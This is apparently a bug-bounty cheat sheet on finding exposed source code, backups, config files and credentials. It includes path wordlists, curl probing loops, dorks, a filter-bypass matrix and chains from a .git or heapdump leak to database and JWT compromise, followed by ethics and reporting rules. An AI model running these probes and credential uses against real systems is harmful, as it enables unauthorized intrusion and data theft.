# Information Disclosure / Sensitive Files / Backups

> Perspective: black-box, actively probe paths + passively collect front-end clues

## 1. One-line Summary

Information disclosure = the service exposes assets that should not be exposed (source code, config, keys, credentials, PII).
SRC focus: **the endpoint of the chain** — a single `.git` leak can directly yield the database password → escalating it to P0.
Of 7,337 WooYun cases, **48.7% are sensitive information disclosure**, and **40% involve credentials / databases**.

---

## 2. High-frequency Entry Points (sorted by hit rate)

### 2.1 Version Control Leaks (560 cases)

| Path | Meaning | Exploitation tool |
|------|------|---------|
| `/.git/config` | Git config (contains remote address) | GitHack, git-dumper, dvcs-ripper |
| `/.git/HEAD` | Current branch | same as above |
| `/.git/index` | Staging area index | same as above |
| `/.git/logs/HEAD` | Operation log | same as above |
| `/.git/objects/` | Object storage | same as above |
| `/.svn/entries` | SVN ≤1.6 entry (**393 high-frequency cases**) | svn-extractor |
| `/.svn/wc.db` | SVN 1.7+ SQLite | sqlite3 wc.db |
| `/.svn/all-wcprops` | SVN working copy properties | - |
| `/.svn/pristine/` | Original files | - |
| `/.hg/` | Mercurial | dvcs-ripper |
| `/.bzr/` | Bazaar | dvcs-ripper |
| `/CVS/Entries` | CVS | - |

### 2.2 Backup Files (565 cases, highest hit rate)

```
# Archives (530 hits)
/wwwroot.rar    /wwwroot.zip    /wwwroot.tar.gz
/www.rar        /www.zip        /www.tar.gz
/web.rar        /web.zip        /web.tar.gz
/site.rar       /site.zip       /site.tar.gz
/backup.zip     /backup.tar.gz
/{domain}.zip   /{domain}.rar   /{domain}.tar.gz   # e.g.: example.com.zip
/{IP}.zip                                          # e.g.: 1.2.3.4.zip
/{year}.zip / /backup_2024.zip / /old_2023.zip

# SQL (136 hits)
/backup.sql     /database.sql   /db.sql   /dump.sql
/{dbname}.sql   /data.sql       /sql.txt

# Config backups (101 hits)
/config.php.bak       /config.php~
/config.php.swp       /.config.php.swp
/config_global.php.bak
/uc_server/data/config.inc.php.bak
/web.config.bak       /.env.bak
/database.yml.bak

# Editor temporary files
/index.php.swp        /.index.php.swp
/index.php~           /.index.php~
/.DS_Store            /Thumbs.db
```

### 2.3 Configuration Files (cleartext exposure)

```
# Java/Spring
/WEB-INF/web.xml
/WEB-INF/applicationContext.xml
/WEB-INF/classes/application.properties
/WEB-INF/classes/jdbc.properties
/WEB-INF/classes/database.yml
/WEB-INF/classes/hibernate.cfg.xml
/application.yml          /application-prod.yml
/bootstrap.yml

# PHP
/config.php               /config/config.php
/include/config.php       /data/config.php
/conf/config.inc.php      /application/config/database.php

# .NET
/web.config               /App_Data/   /bin/
/connectionStrings.config

# Modern frameworks
/.env                     /.env.local   /.env.production
/.env.development         /.env.staging
/config.json              /settings.py
/appsettings.json         /appsettings.Production.json

# Containers / k8s
/docker-compose.yml       /docker-compose.yaml
/Dockerfile
/.kube/config
```

### 2.4 Probe Files (47+34+38 hits)

```
/phpinfo.php   /info.php   /test.php   /1.php   /i.php   /t.php
/probe.php     /debug.php
/test.jsp      /info.jsp
/server-status   /server-info     # Apache mod_status
/jolokia/list                     # JMX
```

### 2.5 Logs (23+ hits)

```
/ctp.log                  # high-frequency in Seeyon OA
/logs/ctp.log
/debug.log    /error.log    /access.log    /application.log
/runtime/logs/            # ThinkPHP
/storage/logs/            # Laravel
/var/log/                 # occasionally mapped to the web root
/WEB-INF/logs/
/_catalina.out
```

### 2.6 Database Management Panels (46 hits)

```
/phpmyadmin/   /phpMyAdmin/   /pma/   /myadmin/   /mysql/
/adminer.php   /adminer/
```

### 2.7 OSS / S3 Bucket (new hotspot in the cloud era)

```
# AWS S3
https://{bucket}.s3.amazonaws.com/
https://{bucket}.s3.{region}.amazonaws.com/
https://s3.amazonaws.com/{bucket}/

# Aliyun OSS
https://{bucket}.oss-{region}.aliyuncs.com/

# Tencent Cloud COS
https://{bucket}.cos.{region}.myqcloud.com/

# List objects (public bucket)
?list-type=2
?prefix=&delimiter=/
```

Tools: `s3scanner`, `gobuster s3`, `oss-attack`.

---

## 3. Probing Techniques

### 3.1 One-line Command Probes

```bash
# Version control
for p in .git/config .git/HEAD .svn/entries .svn/wc.db .hg/store; do
  curl -s -o /dev/null -w "%{http_code} $p\n" https://target/$p
done

# Backup files
for ext in zip rar tar.gz sql bak; do
  for name in www web site backup wwwroot data; do
    curl -s -o /dev/null -w "%{http_code} /$name.$ext\n" https://target/$name.$ext
  done
done

# Domain / subdomain backups
DOMAIN=$(echo target.com | sed 's/\./ /g' | awk '{print $1}')
curl -s -o /dev/null -w "%{http_code} /$DOMAIN.zip\n" https://target/$DOMAIN.zip
```

### 3.2 Automated Scanning

```bash
# dirsearch / ffuf with a sensitive wordlist
dirsearch -u https://target/ -e php,jsp,asp,bak,zip,rar,sql -w wordlists/sensitive.txt
ffuf -u https://target/FUZZ -w sensitive-paths.txt -mc 200,301 -fc 404

# Dedicated tools
nuclei -u https://target -t exposures/

# .git automatic recovery
git-dumper https://target/.git/ ./loot/
GitHack https://target/.git/
```

### 3.3 Google Hacking Dork List

```
site:target.com filetype:sql
site:target.com filetype:bak
site:target.com filetype:env
site:target.com filetype:log
site:target.com inurl:.git
site:target.com inurl:.svn
site:target.com intitle:"index of" .git
site:target.com inurl:phpinfo
site:target.com "db_password"
site:target.com "mysql_connect"
inurl:wp-config.php.bak

# Github / Gitee keyword leaks
"target.com" password
"@target.com" filename:.env
```

### 3.4 Passive Information (front-end clues)

| Source | What to look for |
|------|------|
| HTML comments | `<!-- TODO: remove admin/admin before launch -->` |
| JS files | `apiKey =`, `SECRET_KEY =`, `token =`, `/api/internal/` paths |
| Source map | Whether the site exposes `.map` files, which can restore original TS/SCSS |
| Response headers | `X-Powered-By`, `Server`, `X-AspNet-Version`, `X-DNS-Prefetch-Control` |
| robots.txt | `Disallow: /admin/` exposing the management path |
| sitemap.xml | Exposes non-linked URLs |
| crossdomain.xml / clientaccesspolicy.xml | Flash/Silverlight cross-domain config |
| `.well-known/security.txt` | Contact information |
| `.well-known/openid-configuration` | OAuth config (can see jwks_uri) |
| Wayback Machine | Historical pages may expose deleted interfaces |

### 3.5 Error-page Trigger List (making the target "error out on purpose")

```
?id=1'              → SQL error (exposes database type + path)
?id[]=1             → type error (PHP/Java reports a stack trace)
?file=              → empty value causes path leak
?xml=<a/>           → XML parsing error
/exists.php?p=null  → view the stack
```

---

## 4. Bypass Matrix

| Block | Bypass |
|------|------|
| `.git` path blocked by nginx | `.GIT/`, `.GiT/`, `%2egit/`, `/x/../.git/`, `//.git/` |
| `.env` blocked | `/static/../.env`, `/uploads/.env`, `/.env%20`, `/.env.bak` |
| Backup file extension blocked | `.bak.bak`, `.swp` instead of `.bak`, URL-encoded extension |
| Cloudflare blocking | Find the origin IP (bypass CDN, see `ssrf-cache-host.md`) |
| Filename obfuscation | Timestamps: `/backup_$(date +%Y%m%d).zip`, `/2024-01-15.sql` |
| Case | `/Backup.ZIP`, `/Config.PHP.BAK` |

---

## 5. Exploitation / Privilege Escalation / Lateral Movement (chain amplification)

### 5.1 .git → All Source Code → DB Password

```bash
# 1. dump
git-dumper https://target/.git/ ./loot/
cd loot && git log --all
git show <commit>:config.php

# 2. Find credentials
grep -rE "(password|secret|apikey|token|jdbc:|mysql://|redis://)" .

# 3. Direct connection
mysql -h db.internal -u root -p
```

Reference case: wooyun-2015-0125565 (Qianmo Finance .git → database password).

### 5.2 .env → S3 / Stripe / SMTP Takeover

```
.env commonly contains:
  AWS_ACCESS_KEY_ID=AKIA...
  AWS_SECRET_ACCESS_KEY=...
  STRIPE_SECRET_KEY=sk_live_...
  SENDGRID_API_KEY=SG....
  TWILIO_AUTH_TOKEN=...
  JWT_SECRET=...
  DATABASE_URL=postgres://user:pass@host/db

→ AWS: aws s3 ls / aws sts get-caller-identity (do not perform delete/create actions)
→ JWT secret: locally forge tokens for any user
→ DB: connect and read the schema only, do not export
```

### 5.3 Heapdump → Passwords in JVM Memory

```bash
curl http://target/actuator/heapdump -o heap.bin
strings heap.bin | grep -iE "(password|secret|jdbc|jwt|redis|aws)" | sort -u
# Or analyze with MAT, jhat
```

### 5.4 Swagger / API docs → Hidden Endpoints

```
/swagger-ui.html shows the complete API list, including:
  /api/internal/admin/users
  /api/v2/secret-debug
  /api/dev/dump
The attacker hits everything based on this list.
```

### 5.5 SMS / Email / Payment API Credentials → All-user Takeover

```
Leaked SMS-platform credentials → call /api/sendSms to see all users' verification codes
→ use the codes to reset any user's password → account takeover
```

Reference: wooyun-2015-0128813 (SMS interface of a snack e-commerce site).

---

## 6. Real-case Fingerprints

| Case ID | Type | Exploitation chain |
|--------|------|------|
| wooyun-2015-0123377 | Whole-site source code zip | source code → config → database → privesc |
| wooyun-2013-038850 | TOM SVN leak | SVN → source code → SQL injection |
| wooyun-2015-0120183 | log4net.xml/MongoDB config | config → MongoDB → data |
| wooyun-2015-0163955 | Huangjin Group session log | backend → log → session hijacking |
| wooyun-2015-0128813 | Snack e-commerce SMS API | API → SMS → account takeover |
| wooyun-2015-0125565 | Qianmo Finance .git | .git → database password |
| wooyun-2014-049693 | PCLady .svn | .svn → directory traversal |
| wooyun-2014-085529 | hitao MongoDB unauthorized | Mongo → FTP → order data |
| wooyun-2015-0150430 | An airline's email | email → domain password → VPN |
| wooyun-2013-039470 | A computer maker's data.zip | backup file → database config |

General fingerprints:

- **`/static/.git/HEAD` 200** + content `ref: refs/heads/main` → dump immediately
- **`/.env` returns 200 + Content-Type: text/plain** + contains `=` → config leak
- **`/wwwroot.rar` Content-Length > 1MB** → whole-site source code
- **`/server-status` contains `Apache Status` + IP list** → mod_status exposure
- **`/actuator/health` 200 + `{"status":"UP"}`** → probe further into actuator/env / heapdump
- **`/swagger-ui.html` + renders an API list** → full set of endpoints

---

## 7. Reproduction / Evidence Essentials

### 7.1 Report Must-Haves

1. Full request URL (including protocol)
2. Response status code + key headers
3. Response body snippet (**sensitive data must be redacted**)
4. Impact: estimated based on the leaked content (password → DB → user data)

### 7.2 Redaction Style

```
Original (do not put in the report):
  spring.datasource.password=Mp4ssw0rd!

Report (write it like this):
  spring.datasource.password=M****d! (13 chars total)

Original:
  ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDxxxx... user@host

Report:
  ssh-rsa AAAAB3...(first 8 chars + last 8 chars + length) user@host
```

### 7.3 CVSS Reference

```
.git source code leak         CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N = 7.5
.env prod credential leak     CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 (depends on credential use)
phpinfo.php exposure          CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N = 5.3
heapdump with DB password     = 9.8 Critical
public S3 bucket with PII     = 7.5+
```

### 7.4 Impact Section Wording

```
Through unauthorized access to the /.git/ directory, an attacker can use the git-dumper tool to
fully recover the backend source code (about 400 .java files). In the source code,
src/main/resources/application-prod.yml stores the following credentials in cleartext:
1. The primary database password (mysql://prod-db:3306), allowing direct read of all user tables;
2. The JWT signing key, allowing forgery of any user's identity;
3. The AWS S3 Access Key, allowing read of all user-uploaded files in the bucket.

I stopped at the step of "reading the application-prod.yml filename" and did not attempt to connect with any credential.
```

---

## 8. What Not To Do

- **Forbidden**: cloning the full source code to your own GitHub / public repository. Save locally and delete after reporting.
- **Forbidden**: using leaked AWS / Stripe / SendGrid credentials to create resources, send emails, or charge money.
- **Forbidden**: using leaked DB credentials to connect to the production database and export data. Do only the minimal verification of "being able to telnet to the port + seeing the DB banner".
- **Forbidden**: using a leaked SMS API to send SMS to real phone numbers.
- **Forbidden**: pasting full credentials in the report. Redact them, attach a sha256 fingerprint to prove you obtained them.
- **Limit**: scan at 1–5 rps; keep the backup wordlist under 1000 entries to avoid triggering risk control.

## H1 Real Cases

_A total of 319 publicly disclosed HackerOne High/Critical reports match this category, sorted by (bounty + votes×100) and taking the Top 12_

| Severity | $ | Program | Title (click for original report) | Summary |
|---|--:|---|---|---|
| Critical | 50000 usd | Shopify | [Github access token exposure](https://hackerone.com/reports/1087489) | While dissecting an application made by one of your employees I found his GitHub Personal Access Token (PAT), he's a member of … |
| High | 20000 usd | HackerOne | [Account takeover via leaked session cookie](https://hackerone.com/reports/745324) | Summary:** You are disclose for me you session Description:** you are gevi me your session on last report I am can use your ses… |
| Critical | — | HackerOne | [Confidential data of users and limited metadata of programs and reports accessible via GraphQL](https://hackerone.com/reports/489146) | Summary:** The GraphQL endpoint doesn't have access controls implemented properly |
| Critical | 25000 usd | HackerOne | [The /reports/:id.json endpoint discloses potentially sensitive user attributes when reporter summ…](https://hackerone.com/reports/3000510) | Hi The.json endpoint of any disclosed report is leaking reporter's email, OTP backup codes, reporter's phone number, "graphql_s… |
| Critical | 39999 usd | Uber | [[Pre-Submission][H1-4420-2019] API access to Phabricator on code.uberinternal.com from leaked cer…](https://hackerone.com/reports/591813) | [Pre-Submission][H1-4420-2019] API access to Phabricator on code.uberinternal.com from leaked certificate in git repo |
| High | 7500 usd | HackerOne | [Customer private program can disclose email any users through invited via username](https://hackerone.com/reports/807448) | Summary: Hey team,This bug could have been used by my calculations a long time ago Steps To Reproduce: 1)Go to https://hackeron… |
| High | — | Uber | [Sensitive user information disclosure at bonjour.uber.com/marketplace/_rpc via the 'userUuid' par…](https://hackerone.com/reports/542340) | Sensitive user information disclosure at bonjour.uber.com/marketplace/_rpc via the 'userUuid' parameter |
| High | 15000 usd | Snapchat | [Open prod Jenkins instance](https://hackerone.com/reports/231460) | Open prod Jenkins instance |
| Critical | — | Snapchat | [Github Token Leaked publicly for https://github.sc-corp.net](https://hackerone.com/reports/396467) | Description : GitHub is a truly awesome service but it is unwise to put any sensitive data in code that is hosted on GitHub and… |
| High | 10000 usd | Snapchat | [Access to multiple production Grafana dashboards](https://hackerone.com/reports/663628) | Access to multiple production Grafana dashboards |
| High | 12500 usd | HackerOne | [An attacker can can view any hacker email via  /SaveCollaboratorsMutation operation name](https://hackerone.com/reports/2032716) | Summary:** An attacker can view any attacker or normal user email after send invitation via dummy report , disclose their priva… |
| Critical | 10000 usd | GitLab | [gitlab-workhorse bypass in Gitlab::Middleware::Multipart allowing files in `allowed_paths` to be …](https://hackerone.com/reports/850447) | Summary Extracted from https://hackerone.com/reports/835455#activity-7672566 While testing and looking at the patch for the nug… |

**Weakness distribution matching this category:**

- Information Disclosure: 207 entries
- Cleartext Storage of Sensitive Information: 22 entries
- Insecure Storage of Sensitive Information: 22 entries
- Privacy Violation: 15 entries
- Information Exposure Through Directory Listing: 12 entries
- Insufficiently Protected Credentials: 10 entries
- Uncategorized → manually categorized: 6 entries
- Information Exposure Through Debug Information: 5 entries
- Cleartext Transmission of Sensitive Information: 5 entries
- Information Exposure Through Sent Data: 4 entries
- Information Exposure Through an Error Message: 3 entries
- Missing Encryption of Sensitive Data: 3 entries
- File and Directory Information Exposure: 2 entries
- Password in Configuration File: 2 entries
- Inclusion of Sensitive Information in an Include File: 1 entry
